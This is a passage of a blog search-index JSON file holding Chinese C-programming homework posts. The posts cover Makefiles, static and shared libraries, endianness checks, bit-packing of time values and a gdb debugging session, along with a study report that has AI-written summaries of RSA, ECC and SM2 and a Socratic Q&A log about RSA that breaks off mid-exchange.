union","date":"2024-10-08","objectID":"/posts/homework/c%E7%BC%96%E7%A8%8B%E5%85%B7%E6%B5%8B%E8%AF%95/:4:3","tags":[null],"title":"C编程⼯具测试","uri":"/posts/homework/c%E7%BC%96%E7%A8%8B%E5%85%B7%E6%B5%8B%E8%AF%95/"},{"categories":["homework"],"content":"动态库\r","date":"2024-10-08","objectID":"/posts/homework/c%E7%BC%96%E7%A8%8B%E5%85%B7%E6%B5%8B%E8%AF%95/:5:0","tags":[null],"title":"C编程⼯具测试","uri":"/posts/homework/c%E7%BC%96%E7%A8%8B%E5%85%B7%E6%B5%8B%E8%AF%95/"},{"categories":["homework"],"content":"制作动态库\rMakefile libble.so: cebitfields.o cebitwise.o celibrary.o cepointer.o ceunion.o gcc -shared *.o -o libble.so cebitfields.o: cebitfields.c ble.h gcc -c cebitfields.c -fpic cebitwise.o: cebitwise.c ble.h gcc -c cebitwise.c -fpic celibrary.o: celibrary.c ble.h gcc -c celibrary.c -fpic cepointer.o: cepointer.c ble.h gcc -c cepointer.c -fpic ceunion.o: ceunion.c ble.h gcc -c ceunion.c -fpic clean: rm -f *.o➜ p3-2 git:(master) ✗ make \u0026\u0026 make clean gcc -c cebitfields.c -fpic gcc -c cebitwise.c -fpic gcc -c celibrary.c -fpic gcc -c cepointer.c -fpic gcc -c ceunion.c -fpic gcc -shared *.o -o libble.so rm -f *.o","date":"2024-10-08","objectID":"/posts/homework/c%E7%BC%96%E7%A8%8B%E5%85%B7%E6%B5%8B%E8%AF%95/:5:1","tags":[null],"title":"C编程⼯具测试","uri":"/posts/homework/c%E7%BC%96%E7%A8%8B%E5%85%B7%E6%B5%8B%E8%AF%95/"},{"categories":["homework"],"content":"链接动态库\r➜ p3-2 git:(master) ✗ gcc -o main main.c -L ./home/zhanhe/cc/2024-10-08/p3-2 -lble","date":"2024-10-08","objectID":"/posts/homework/c%E7%BC%96%E7%A8%8B%E5%85%B7%E6%B5%8B%E8%AF%95/:5:2","tags":[null],"title":"C编程⼯具测试","uri":"/posts/homework/c%E7%BC%96%E7%A8%8B%E5%85%B7%E6%B5%8B%E8%AF%95/"},{"categories":["homework"],"content":"编译运行\r➜ p3-2 git:(master) ✗ ./main use -i to chose method 1 -\u003e fields 2 -\u003e wise 3 -\u003e library 4 -\u003e pointer 5 -\u003e union ➜ p3-2 git:(master) ✗ ./main -i 10 Wrong Parameters ➜ p3-2 git:(master) ✗ ./main -i Parameters are missing ➜ p3-2 git:(master) ✗ ./main -i 1 Little Endian (Bit-field Method) ➜ p3-2 git:(master) ✗ ./main -i 2 Little Endian (Bitwise Method) ➜ p3-2 git:(master) ✗ ./main -i 3 Little Endian (Standard Library Method) ➜ p3-2 git:(master) ✗ ./main -i 4 Little Endian (Pointer Method) ➜ p3-2 git:(master) ✗ ./main -i 5 Little Endian (Union Method)","date":"2024-10-08","objectID":"/posts/homework/c%E7%BC%96%E7%A8%8B%E5%85%B7%E6%B5%8B%E8%AF%95/:5:3","tags":[null],"title":"C编程⼯具测试","uri":"/posts/homework/c%E7%BC%96%E7%A8%8B%E5%85%B7%E6%B5%8B%E8%AF%95/"},{"categories":["homework"],"content":"项目结构\r","date":"2024-10-08","objectID":"/posts/homework/c%E7%BC%96%E7%A8%8B%E5%85%B7%E6%B5%8B%E8%AF%95/:6:0","tags":[null],"title":"C编程⼯具测试","uri":"/posts/homework/c%E7%BC%96%E7%A8%8B%E5%85%B7%E6%B5%8B%E8%AF%95/"},{"categories":["homework"],"content":"组织项目结构\r➜ p3-3 git:(master) ✗ tree . ├── bin ├── docs ├── include │ └── ble.h ├── lib ├── Makefile └── src ├── cebitfields.c ├── cebitwise.c ├── celibrary.c ├── cepointer.c ├── ceunion.c └── main.c 6 directories, 8 files","date":"2024-10-08","objectID":"/posts/homework/c%E7%BC%96%E7%A8%8B%E5%85%B7%E6%B5%8B%E8%AF%95/:6:1","tags":[null],"title":"C编程⼯具测试","uri":"/posts/homework/c%E7%BC%96%E7%A8%8B%E5%85%B7%E6%B5%8B%E8%AF%95/"},{"categories":["homework"],"content":"编写Makefile\rtarget = ./bin/main src = $(wildcard ./src/*.c) obj = $(patsubst %.c,%.o, $(src)) include = ./include $(target): $(obj) gcc $^ -o $@ %.o:%.c gcc $\u003c -c -I $(include) -o $@ clean: rm -f $(obj)","date":"2024-10-08","objectID":"/posts/homework/c%E7%BC%96%E7%A8%8B%E5%85%B7%E6%B5%8B%E8%AF%95/:6:2","tags":[null],"title":"C编程⼯具测试","uri":"/posts/homework/c%E7%BC%96%E7%A8%8B%E5%85%B7%E6%B5%8B%E8%AF%95/"},{"categories":["homework"],"content":"编译运行\r➜ p3-3 git:(master) ✗ make \u0026\u0026 make clean gcc src/cebitfields.c -c -I ./include -o src/cebitfields.o gcc src/cebitwise.c -c -I ./include -o src/cebitwise.o gcc src/celibrary.c -c -I ./include -o src/celibrary.o gcc src/cepointer.c -c -I ./include -o src/cepointer.o gcc src/ceunion.c -c -I ./include -o src/ceunion.o gcc src/main.c -c -I ./include -o src/main.o gcc src/cebitfields.o src/cebitwise.o src/celibrary.o src/cepointer.o src/ceunion.o src/main.o -o bin/main rm -f ./src/cebitfields.o ./src/cebitwise.o ./src/celibrary.o ./src/cepointer.o ./src/ceunion.o ./src/main.o ➜ p3-3 git:(master) ✗ tree . ├── bin │ └── main ├── docs ├── include │ └── ble.h ├── lib ├── Makefile └── src ├── cebitfields.c ├── cebitwise.c ├── celibrary.c ├── cepointer.c ├── ceunion.c └── main.c 6 directories, 9 files ➜ p3-3 git:(master) ✗ ./bin/main use -i to chose method 1 -\u003e fields 2 -\u003e wise 3 -\u003e library 4 -\u003e pointer 5 -\u003e union ➜ p3-3 git:(master) ✗ ./bin/main -i 1 Little Endian (Bit-field Method) ➜ p3-3 git:(master) ✗ ./bin/main -i 2 Little Endian (Bitwise Method) ➜ p3-3 git:(master) ✗ ./bin/main -i 3 Little Endian (Standard Library Method) ➜ p3-3 git:(master) ✗ ./bin/main -i 4 Little Endian (Pointer Method) ➜ p3-3 git:(master) ✗ ./bin/main -i 5 Little Endian (Union Method) ➜ p3-3 git:(master) ✗ ./bin/main -i Parameters are missing ➜ p3-3 git:(master) ✗ ./bin/main -i 10 Wrong Parameters","date":"2024-10-08","objectID":"/posts/homework/c%E7%BC%96%E7%A8%8B%E5%85%B7%E6%B5%8B%E8%AF%95/:6:3","tags":[null],"title":"C编程⼯具测试","uri":"/posts/homework/c%E7%BC%96%E7%A8%8B%E5%85%B7%E6%B5%8B%E8%AF%95/"},{"categories":["homework"],"content":"位运算\r","date":"2024-10-08","objectID":"/posts/homework/%E4%BD%8D%E8%BF%90%E7%AE%97/:0:0","tags":[null],"title":"位运算","uri":"/posts/homework/%E4%BD%8D%E8%BF%90%E7%AE%97/"},{"categories":["homework"],"content":"模块编写\r","date":"2024-10-08","objectID":"/posts/homework/%E4%BD%8D%E8%BF%90%E7%AE%97/:1:0","tags":[null],"title":"位运算","uri":"/posts/homework/%E4%BD%8D%E8%BF%90%E7%AE%97/"},{"categories":["homework"],"content":"头文件声明\r#include\u003cstdio.h\u003e #include\u003ctime.h\u003e","date":"2024-10-08","objectID":"/posts/homework/%E4%BD%8D%E8%BF%90%E7%AE%97/:1:1","tags":[null],"title":"位运算","uri":"/posts/homework/%E4%BD%8D%E8%BF%90%E7%AE%97/"},{"categories":["homework"],"content":"函数、变量声明\runsigned short TIME; void setHour(int h); void setMinute(int m); void setSecond(int s); void getTime(); void printTime();","date":"2024-10-08","objectID":"/posts/homework/%E4%BD%8D%E8%BF%90%E7%AE%97/:1:2","tags":[null],"title":"位运算","uri":"/posts/homework/%E4%BD%8D%E8%BF%90%E7%AE%97/"},{"categories":["homework"],"content":"函数编写\rvoid getTime(){ time_t currentTime; struct tm *localTime; time(\u0026currentTime); localTime = localtime(\u0026currentTime); //6 6 5 //h m s setHour(localTime-\u003etm_hour); setMinute(localTime-\u003etm_min); setSecond(localTime-\u003etm_sec); } void printTime(){ printf(\"Now is: %d:%d:%d\\n\", TIME \u003e\u003e 11, (TIME \u0026 (0x3f \u003c\u003c 5)) \u003e\u003e 5, TIME \u0026 0x1f); } void setHour(int h){ unsigned int th = h \u0026 0x3f; th \u003c\u003c= 11; TIME \u0026= ~(0x3f \u003c\u003c 11); TIME |= th; } void setMinute(int m){ unsigned int tm = m \u0026 0x3f; tm \u003c\u003c= 5; TIME \u0026= ~(0x3f \u003c\u003c 5); TIME |= tm; } void setSecond(int s){ unsigned int ts = s \u0026 0x1f; TIME \u0026= ~(0x1f); TIME |= ts; }","date":"2024-10-08","objectID":"/posts/homework/%E4%BD%8D%E8%BF%90%E7%AE%97/:1:3","tags":[null],"title":"位运算","uri":"/posts/homework/%E4%BD%8D%E8%BF%90%E7%AE%97/"},{"categories":["homework"],"content":"模块测试\r","date":"2024-10-08","objectID":"/posts/homework/%E4%BD%8D%E8%BF%90%E7%AE%97/:2:0","tags":[null],"title":"位运算","uri":"/posts/homework/%E4%BD%8D%E8%BF%90%E7%AE%97/"},{"categories":["homework"],"content":"测试代码\rint main(){ getTime(); printTime(); printf(\"update:\"); setHour(20); setMinute(20); setSecond(20); printTime(); printf(\"update Minute:\"); setMinute(15); printTime(); printf(\"Minute is:%d\\n\", (TIME \u0026 (0x3f \u003c\u003c 5)) \u003e\u003e 5); }","date":"2024-10-08","objectID":"/posts/homework/%E4%BD%8D%E8%BF%90%E7%AE%97/:2:1","tags":[null],"title":"位运算","uri":"/posts/homework/%E4%BD%8D%E8%BF%90%E7%AE%97/"},{"categories":["homework"],"content":"结果\r./main Now is: 11:10:15 update:Now is: 20:20:20 update Minute:Now is: 20:15:20 Minute is:15","date":"2024-10-08","objectID":"/posts/homework/%E4%BD%8D%E8%BF%90%E7%AE%97/:2:2","tags":[null],"title":"位运算","uri":"/posts/homework/%E4%BD%8D%E8%BF%90%E7%AE%97/"},{"categories":["homework"],"content":"完整代码\r#include\u003cstdio.h\u003e #include\u003ctime.h\u003e unsigned short TIME; void setHour(int h); void setMinute(int m); void setSecond(int s); void getTime(); void printTime(); int main(){ getTime(); printTime(); printf(\"update:\"); setHour(20); setMinute(20); setSecond(20); printTime(); printf(\"update Minute:\"); setMinute(15); printTime(); printf(\"Minute is:%d\\n\", (TIME \u0026 (0x3f \u003c\u003c 5)) \u003e\u003e 5); } void getTime(){ time_t currentTime; struct tm *localTime; time(\u0026currentTime); localTime = localtime(\u0026currentTime); //6 6 5 //h m s setHour(localTime-\u003etm_hour); setMinute(localTime-\u003etm_min); setSecond(localTime-\u003etm_sec); } void printTime(){ printf(\"Now is: %d:%d:%d\\n\", TIME \u003e\u003e 11, (TIME \u0026 (0x3f \u003c\u003c 5)) \u003e\u003e 5, TIME \u0026 0x1f); } void setHour(int h){ unsigned int th = h \u0026 0x3f; th \u003c\u003c= 11; TIME \u0026= ~(0x3f \u003c\u003c 11); TIME |= th; } void setMinute(int m){ unsigned int tm = m \u0026 0x3f; tm \u003c\u003c= 5; TIME \u0026= ~(0x3f \u003c\u003c 5); TIME |= tm; } void setSecond(int s){ unsigned int ts = s \u0026 0x1f; TIME \u0026= ~(0x1f); TIME |= ts; }","date":"2024-10-08","objectID":"/posts/homework/%E4%BD%8D%E8%BF%90%E7%AE%97/:3:0","tags":[null],"title":"位运算","uri":"/posts/homework/%E4%BD%8D%E8%BF%90%E7%AE%97/"},{"categories":["homework"],"content":"编译运⾏ “bestidiocs2024/ch02/c/testgdb.c”，记录编译运⾏结果\r➜ c git:(master) ✗gcc -g testgdb.c -o testgdb ➜ c git:(master) ✗ ls car.c hello.c lib make project test.c testgdb testgdb.c ➜ c git:(master) ✗ ./testgdb The sum of 1-50 is 1275 The sum of 1-50 is 1275","date":"2024-10-08","objectID":"/posts/homework/gdb%E8%B0%83%E8%AF%95/:1:0","tags":[null],"title":"课上测试：gdb 调试","uri":"/posts/homework/gdb%E8%B0%83%E8%AF%95/"},{"categories":["homework"],"content":"调试代码\r","date":"2024-10-08","objectID":"/posts/homework/gdb%E8%B0%83%E8%AF%95/:2:0","tags":[null],"title":"课上测试：gdb 调试","uri":"/posts/homework/gdb%E8%B0%83%E8%AF%95/"},{"categories":["homework"],"content":"设置函数断点和行断点\rpwndbg\u003e b main Breakpoint 1 at 0x1141: file testgdb.c, line 8. pwndbg\u003e b 10 Breakpoint 2 at 0x1150: file testgdb.c, line 10.","date":"2024-10-08","objectID":"/posts/homework/gdb%E8%B0%83%E8%AF%95/:2:1","tags":[null],"title":"课上测试：gdb 调试","uri":"/posts/homework/gdb%E8%B0%83%E8%AF%95/"},{"categories":["homework"],"content":"设置临时断点\rpwndbg\u003e tb 12 Temporary breakpoint 3 at 0x55555555516d: file testgdb.c, line 12.","date":"2024-10-08","objectID":"/posts/homework/gdb%E8%B0%83%E8%AF%95/:2:2","tags":[null],"title":"课上测试：gdb 调试","uri":"/posts/homework/gdb%E8%B0%83%E8%AF%95/"},{"categories":["homework"],"content":"设置条件断点\rpwndbg\u003e b 24 if i == 25 Breakpoint 4 at 0x5555555551d2: file testgdb.c, line 24. pwndbg\u003e c Continuing. Breakpoint 4, sum (m=50) at testgdb.c:24 24 n += i;","date":"2024-10-08","objectID":"/posts/homework/gdb%E8%B0%83%E8%AF%95/:2:3","tags":[null],"title":"课上测试：gdb 调试","uri":"/posts/homework/gdb%E8%B0%83%E8%AF%95/"},{"categories":["homework"],"content":"使⽤单步运⾏等其他命令\rr\rpwndbg\u003e r Starting program: /home/zhanhe/bestidiocs2024/ch02/c/testgdb [Thread debugging using libthread_db enabled] Using host libthread_db library \"/lib/x86_64-linux-gnu/libthread_db.so.1\". Breakpoint 1, main () at testgdb.c:8 8 int i, n = 0;n\rpwndbg\u003e n 9 pi = \u0026i; pwndbg\u003e n Breakpoint 2, main () at testgdb.c:10 10 int arr[3] = { 10, 20, 30 };c\rpwndbg\u003e c Continuing. Temporary breakpoint 3, main () at testgdb.c:12 12 sum(50);s\rpwndbg\u003e s sum (m=50) at testgdb.c:22 22 int i, n = 0;p\rpwndbg\u003e p i $1 = 25 pwndbg\u003e c Continuing. The sum of 1-50 is 1275 The sum of 1-50 is 1275 [Inferior 1 (process 1118) exited normally]info b\rpwndbg\u003e info b Num Type Disp Enb Address What 1 breakpoint keep y 0x0000555555555141 in main at testgdb.c:8 breakpoint already hit 1 time 2 breakpoint keep y 0x0000555555555150 in main at testgdb.c:10 breakpoint already hit 1 time 4 breakpoint keep y 0x00005555555551d2 in sum at testgdb.c:24 stop only if i == 25 breakpoint already hit 1 timedisplay\rdisplay i 1: i = 0set var\rpwndbg\u003e set var i = 51 pwndbg\u003e p i $2 = 51watch\rwatch i Hardware watchpoint 5: i n Hardware watchpoint 5: i Old value = 51 New value = 52delete watch\rdelete watch 5","date":"2024-10-08","objectID":"/posts/homework/gdb%E8%B0%83%E8%AF%95/:2:4","tags":[null],"title":"课上测试：gdb 调试","uri":"/posts/homework/gdb%E8%B0%83%E8%AF%95/"},{"categories":["homework"],"content":"[toc] 第四周预习报告\r","date":"2024-09-29","objectID":"/posts/homework/%E7%AC%AC%E5%9B%9B%E5%91%A8%E9%A2%84%E4%B9%A0%E4%BD%9C%E4%B8%9A/:0:0","tags":[null],"title":"第四周预习报告","uri":"/posts/homework/%E7%AC%AC%E5%9B%9B%E5%91%A8%E9%A2%84%E4%B9%A0%E4%BD%9C%E4%B8%9A/"},{"categories":["homework"],"content":"学习内容\r学习内容 Head First C 嗨翻 C 语⾔ 第5章 《Windows C/C++加密解密实战》第 6，8，13,14 章 重点第14 章，第 6 章了解 ，第 8，,13 参考 课程 mindmap 报告内容参考第⼀周 ","date":"2024-09-29","objectID":"/posts/homework/%E7%AC%AC%E5%9B%9B%E5%91%A8%E9%A2%84%E4%B9%A0%E4%BD%9C%E4%B8%9A/:1:0","tags":[null],"title":"第四周预习报告","uri":"/posts/homework/%E7%AC%AC%E5%9B%9B%E5%91%A8%E9%A2%84%E4%B9%A0%E4%BD%9C%E4%B8%9A/"},{"categories":["homework"],"content":"AI对学习内容的总结\r要求\r让AI（kimi，元宝等）阅读学习内容并进⾏总结，教材内容可以使⽤微信读书或者云班课电⼦教材 总结\r《windows C/C++加密解密实战》第 6，8，13,14 章\r以下是第6、8、13、14章的学习内容总结： 第6章：非对称算法RSA的加解密\rRSA算法概述：RSA是一种广泛使用的公钥加密系统，基于大素数的数学性质。它通过生成一对密钥（公钥和私钥）实现数据的安全传输。 密钥生成：RSA通过两个大素数的乘积生成模数，并使用公钥指数和私钥指数来生成密钥。 加密与解密：加密过程是将明文用公钥指数进行幂运算并取模，而解密过程则使用私钥指数进行逆运算。 安全性：RSA的安全性依赖于大数分解的计算困难性。 第8章：椭圆曲线密码体制\r椭圆曲线概述：椭圆曲线密码体制（ECC）是一种基于椭圆曲线数学结构的公钥加密算法。相比RSA，ECC提供相同安全强度所需的密钥长度更短，因此更加高效。 椭圆曲线的定义：椭圆曲线由一组满足特定方程的点组成，曲线上的加法运算具有封闭性，适用于密码学。 加密与解密：ECC的加密与解密通过曲线上的点运算完成，具有较高的安全性和效率。 安全性：椭圆曲线离散对数问题的计算复杂度为ECC提供了很强的安全性。 第13章：SM2算法的数学基础\rSM2算法概述：SM2是中国国家标准的椭圆曲线公钥密码算法，基于椭圆曲线离散对数问题，适用于数字签名、密钥交换和数据加密。 数学基础：SM2的安全性依赖于椭圆曲线上的离散对数问题，其核心运算包括椭圆曲线点加和点乘操作。 优点：SM2相比传统算法（如RSA），在同等安全性下具有更短的密钥长度和更高的计算效率。 第14章：SM2算法的实现\r实现概述：SM2算法的实现涉及具体的椭圆曲线参数选择、密钥生成、加密和解密的流程。 加密过程：使用接收方的公钥对数据进行加密，确保消息只能被持有私钥的一方解密。 解密过程：接收方使用私钥对密文进行解密，恢复原始消息。 应用场景：SM2广泛应用于数字签名、身份认证等领域，并且在中国的国家标准中被指定为首选算法。 这些内容涵盖了非对称加密RSA和椭圆曲线密码学的基础，以及SM2算法的理论和实践实现。 《Head First C》第5章\r第5章：结构体、联合和位域\r结构体（Structs） 定义：结构体是C语言中的一种复合数据类型，它允许将不同类型的数据组合在一起。通过定义结构体，用户可以更轻松地描述现实世界中的复杂对象。 使用场景：当需要将多个不同类型的数据打包在一起时，例如描述一条鱼的名字、种类、牙齿数量和年龄等。 语法 c复制代码struct fish {\rconst char *name;\rconst char *species;\rint teeth;\rint age;\r}; 访问：使用点运算符来访问结构体中的字段，如snappy.name来获取名称。 联合（Unions） 定义：联合允许将不同的数据类型存储在同一块内存区域中，但每次只能存储其中一个值。 使用场景：联合通常用于内存受限的场景，或者需要节省空间的地方，因为它只为其中的最大数据类型分配空间。 风险：联合无法追踪当前存储的数据类型，因此错误访问会引发程序错误。 位域（Bitfields） 定义：位域允许程序员指定结构体中某个字段的位数，从而节省内存。 使用场景：用于需要对每一位或位段进行控制的场合，例如自定义二进制协议或硬件寄存器操作。 ","date":"2024-09-29","objectID":"/posts/homework/%E7%AC%AC%E5%9B%9B%E5%91%A8%E9%A2%84%E4%B9%A0%E4%BD%9C%E4%B8%9A/:1:1","tags":[null],"title":"第四周预习报告","uri":"/posts/homework/%E7%AC%AC%E5%9B%9B%E5%91%A8%E9%A2%84%E4%B9%A0%E4%BD%9C%E4%B8%9A/"},{"categories":["homework"],"content":"对AI总结的反思\r要求\rAI总结的问题 反思\rAI总结比较精简，适合作为提纲、导图等方式指导学习，更有助于分配自己的学习时间和精力 ","date":"2024-09-29","objectID":"/posts/homework/%E7%AC%AC%E5%9B%9B%E5%91%A8%E9%A2%84%E4%B9%A0%E4%BD%9C%E4%B8%9A/:1:2","tags":[null],"title":"第四周预习报告","uri":"/posts/homework/%E7%AC%AC%E5%9B%9B%E5%91%A8%E9%A2%84%E4%B9%A0%E4%BD%9C%E4%B8%9A/"},{"categories":["homework"],"content":"学习思维导图\r要求\rMermaid 代码与截图(参考Mermaid MindMap语法)或者提交思维导图链接（如果使用线上编辑器，推荐processon,xmind,…） 思维导图\r代码: mindmap root(密码学中的RSA、ECC与SM2) sub章1(RSA加解密算法) sub节1_1(算法概述) 详细1_1_1(基于大素数的公钥加密系统) 详细1_1_2(非对称加密，使用公钥加密，私钥解密) sub节1_2(密钥生成) 详细1_2_1(选择两个大素数p和q) 详细1_2_2(计算n=p*q，生成模数) 详细1_2_3(选择公钥e和私钥d) sub节1_3(加密过程) 详细1_3_1(使用公钥e进行加密运算) 详细1_3_2(加密公式：C = M^e mod n) sub节1_4(解密过程) 详细1_4_1(使用私钥d进行解密运算) 详细1_4_2(解密公式：M = C^d mod n) sub节1_5(安全性) 详细1_5_1(基于大数分解的计算复杂性) 详细1_5_2(密钥长度决定安全强度) sub章2(椭圆曲线密码体制ECC) sub节2_1(算法概述) 详细2_1_1(基于椭圆曲线数学结构) 详细2_1_2(公钥加密算法，与RSA相比更高效) sub节2_2(椭圆曲线定义) 详细2_2_1(曲线满足y^2 = x^3 + ax + b) 详细2_2_2(点的加法运算和标量乘法) sub节2_3(加密与解密) 详细2_3_1(加密：通过曲线上点的运算进行) 详细2_3_2(解密：使用私钥恢复原始消息) sub节2_4(安全性) 详细2_4_1(基于椭圆曲线离散对数问题) 详细2_4_2(提供相同安全性下的更短密钥) sub章3(SM2算法的数学基础) sub节3_1(算法概述) 详细3_1_1(中国国家标准的椭圆曲线加密算法) 详细3_1_2(应用于数字签名、密钥交换、数据加密) sub节3_2(数学基础) 详细3_2_1(椭圆曲线离散对数问题) 详细3_2_2(椭圆曲线上的点加法与点乘法) sub节3_3(安全性与优点) 详细3_3_1(较短的密钥长度提供相同的安全性) 详细3_3_2(比传统算法计算更高效) sub章4(SM2算法的实现) sub节4_1(实现概述) 详细4_1_1(基于椭圆曲线参数选择) 详细4_1_2(密钥生成、加密和解密流程) sub节4_2(加密过程) 详细4_2_1(使用接收方的公钥加密) 详细4_2_2(确保消息只能被持有私钥的人解密) sub节4_3(解密过程) 详细4_3_1(使用私钥解密密文) 详细4_3_2(恢复原始消息) sub节4_4(应用场景) 详细4_4_1(数字签名) 详细4_4_2(身份认证) 详细4_4_3(中国国家标准的首选算法)mindmap root(结构体、联合和位域) Structs(结构体) 定义(复合数据类型) 使用场景(复杂数据模型) 访问(点运算符) Unions(联合) 定义(同一内存区域存储不同类型数据) 使用场景(内存节省) 风险(无法追踪存储类型) Bitfields(位域) 定义(指定位数) 使用场景(精细控制位存储)mindmap\rroot(密码学中的RSA、ECC与SM2)\rsub章1(RSA加解密算法)\rsub节1_1(算法概述)\r详细1_1_1(基于大素数的公钥加密系统)\r详细1_1_2(非对称加密，使用公钥加密，私钥解密)\rsub节1_2(密钥生成)\r详细1_2_1(选择两个大素数p和q)\r详细1_2_2(计算n=p*q，生成模数)\r详细1_2_3(选择公钥e和私钥d)\rsub节1_3(加密过程)\r详细1_3_1(使用公钥e进行加密运算)\r详细1_3_2(加密公式：C = M^e mod n)\rsub节1_4(解密过程)\r详细1_4_1(使用私钥d进行解密运算)\r详细1_4_2(解密公式：M = C^d mod n)\rsub节1_5(安全性)\r详细1_5_1(基于大数分解的计算复杂性)\r详细1_5_2(密钥长度决定安全强度)\rsub章2(椭圆曲线密码体制ECC)\rsub节2_1(算法概述)\r详细2_1_1(基于椭圆曲线数学结构)\r详细2_1_2(公钥加密算法，与RSA相比更高效)\rsub节2_2(椭圆曲线定义)\r详细2_2_1(曲线满足y^2 = x^3 + ax + b)\r详细2_2_2(点的加法运算和标量乘法)\rsub节2_3(加密与解密)\r详细2_3_1(加密：通过曲线上点的运算进行)\r详细2_3_2(解密：使用私钥恢复原始消息)\rsub节2_4(安全性)\r详细2_4_1(基于椭圆曲线离散对数问题)\r详细2_4_2(提供相同安全性下的更短密钥)\rsub章3(SM2算法的数学基础)\rsub节3_1(算法概述)\r详细3_1_1(中国国家标准的椭圆曲线加密算法)\r详细3_1_2(应用于数字签名、密钥交换、数据加密)\rsub节3_2(数学基础)\r详细3_2_1(椭圆曲线离散对数问题)\r详细3_2_2(椭圆曲线上的点加法与点乘法)\rsub节3_3(安全性与优点)\r详细3_3_1(较短的密钥长度提供相同的安全性)\r详细3_3_2(比传统算法计算更高效)\rsub章4(SM2算法的实现)\rsub节4_1(实现概述)\r详细4_1_1(基于椭圆曲线参数选择)\r详细4_1_2(密钥生成、加密和解密流程)\rsub节4_2(加密过程)\r详细4_2_1(使用接收方的公钥加密)\r详细4_2_2(确保消息只能被持有私钥的人解密)\rsub节4_3(解密过程)\r详细4_3_1(使用私钥解密密文)\r详细4_3_2(恢复原始消息)\rsub节4_4(应用场景)\r详细4_4_1(数字签名)\r详细4_4_2(身份认证)\r详细4_4_3(中国国家标准的首选算法)\rmindmap\rroot(密码学中的RSA、ECC与SM2)\rsub章1(RSA加解密算法)\rsub节1_1(算法概述)\r详细1_1_1(基于大素数的公钥加密系统)\r详细1_1_2(非对称加密，使用公钥加密，私钥解密)\rsub节1_2(密钥生成)\r详细1_2_1(选择两个大素数p和q)\r详细1_2_2(计算n=p*q，生成模数)\r详细1_2_3(选择公钥e和私钥d)\rsub节1_3(加密过程)\r详细1_3_1(使用公钥e进行加密运算)\r详细1_3_2(加密公式：C = M^e mod n)\rsub节1_4(解密过程)\r详细1_4_1(使用私钥d进行解密运算)\r详细1_4_2(解密公式：M = C^d mod n)\rsub节1_5(安全性)\r详细1_5_1(基于大数分解的计算复杂性)\r详细1_5_2(密钥长度决定安全强度)\rsub章2(椭圆曲线密码体制ECC)\rsub节2_1(算法概述)\r详细2_1_1(基于椭圆曲线数学结构)\r详细2_1_2(公钥加密算法，与RSA相比更高效)\rsub节2_2(椭圆曲线定义)\r详细2_2_1(曲线满足y^2 = x^3 + ax + b)\r详细2_2_2(点的加法运算和标量乘法)\rsub节2_3(加密与解密)\r详细2_3_1(加密：通过曲线上点的运算进行)\r详细2_3_2(解密：使用私钥恢复原始消息)\rsub节2_4(安全性)\r详细2_4_1(基于椭圆曲线离散对数问题)\r详细2_4_2(提供相同安全性下的更短密钥)\rsub章3(SM2算法的数学基础)\rsub节3_1(算法概述)\r详细3_1_1(中国国家标准的椭圆曲线加密算法)\r详细3_1_2(应用于数字签名、密钥交换、数据加密)\rsub节3_2(数学基础)\r详细3_2_1(椭圆曲线离散对数问题)\r详细3_2_2(椭圆曲线上的点加法与点乘法)\rsub节3_3(安全性与优点)\r详细3_3_1(较短的密钥长度提供相同的安全性)\r详细3_3_2(比传统算法计算更高效)\rsub章4(SM2算法的实现)\rsub节4_1(实现概述)\r详细4_1_1(基于椭圆曲线参数选择)\r详细4_1_2(密钥生成、加密和解密流程)\rsub节4_2(加密过程)\r详细4_2_1(使用接收方的公钥加密)\r详细4_2_2(确保消息只能被持有私钥的人解密)\rsub节4_3(解密过程)\r详细4_3_1(使用私钥解密密文)\r详细4_3_2(恢复原始消息)\rsub节4_4(应用场景)\r详细4_4_1(数字签名)\r详细4_4_2(身份认证)\r详细4_4_3(中国国家标准的首选算法)mindmap\rroot(结构体、联合和位域)\rStructs(结构体)\r定义(复合数据类型)\r使用场景(复杂数据模型)\r访问(点运算符)\rUnions(联合)\r定义(同一内存区域存储不同类型数据)\r使用场景(内存节省)\r风险(无法追踪存储类型)\rBitfields(位域)\r定义(指定位数)\r使用场景(精细控制位存储)\rmindmap\rroot(结构体、联合和位域)\rStructs(结构体)\r定义(复合数据类型)\r使用场景(复杂数据模型)\r访问(点运算符)\rUnions(联合)\r定义(同一内存区域存储不同类型数据)\r使用场景(内存节省)\r风险(无法追踪存储类型)\rBitfields(位域)\r定义(指定位数)\r使用场景(精细控制位存储)","date":"2024-09-29","objectID":"/posts/homework/%E7%AC%AC%E5%9B%9B%E5%91%A8%E9%A2%84%E4%B9%A0%E4%BD%9C%E4%B8%9A/:1:3","tags":[null],"title":"第四周预习报告","uri":"/posts/homework/%E7%AC%AC%E5%9B%9B%E5%91%A8%E9%A2%84%E4%B9%A0%E4%BD%9C%E4%B8%9A/"},{"categories":["homework"],"content":"基于AI的学习\r要求\r至少找到自己理解不是太好2个概念，让AI对自己进行苏格拉底提问 参考下面提示词或者使用AI Agent 提示词：“我在学习XXX知识点，请你以苏格拉底的方式对我进行提问，一次一个问题”\r1. 核心是要求AI工具：“请你以苏格拉底的方式对我进行提问”\r2. 然后AI工具就会给你提问，如果不知道问题的答案，可以反问AI：“你的理解（回答）是什么？”\r3. 如果你觉得差不多了，可以先问问AI工具：“针对我XXX知识点，我理解了吗？”\r4. AI工具会给出它的判断，如果你也觉得自己想清楚了，可以最后问AI工具：“我的回答结束了，请对我的回答进行评价总结”，让它帮你总结一下。学习内容\rHuman: 我在学习RSA知识点，请你以苏格拉底的方式对我进行提问，一次一个问题AI: 好的，我们开始吧！\r**第一个问题：**\rRSA加密算法使用的是什么类型的密钥结构？公钥Human: 公钥AI: 很好！那么，第二个问题：\rRSA中的私钥与公钥有什么区别，它们各自的作用是什么？Human: 公钥公开用于加密，私钥保密用于解密AI: 非常好！那么，第三个问题：\rRSA加密的安全性主要依赖于哪种数学难题？为什么这种难题如此重要？Human: 大素数分解难题，RSA密码体制的安全性依赖于这个难题AI: 正确！第四个问题： 在RSA算法中，密钥生成的过程通常涉及哪些步骤？请简要描述。Human: 随机大素数的选取和随机数的选取AI: 你提到了关键步骤，但可以更具体一些。第五个问题：\r在RSA的密钥生成过程中，选择的两个大素数通常会进行哪些具体的操作以生成公钥和私钥？Human: 随机选一个和pq乘积的欧拉函数互质的数作为公钥，其逆元为私钥AI： 很好，描述得很准确！第六个问题： 在RSA算法中，加密和解密的数学运算分别是什么？请用公式表示。Human： c=pow(m,e,n)\rm=pow(c,d,n)AI： 很好！你对公式的表达很准确。第七个问题： 在RSA算法中，如何确保加密和解密过程中的安全性，特别是在选择大素数时应该注意哪些因素？Human： 你的回答是？AI： 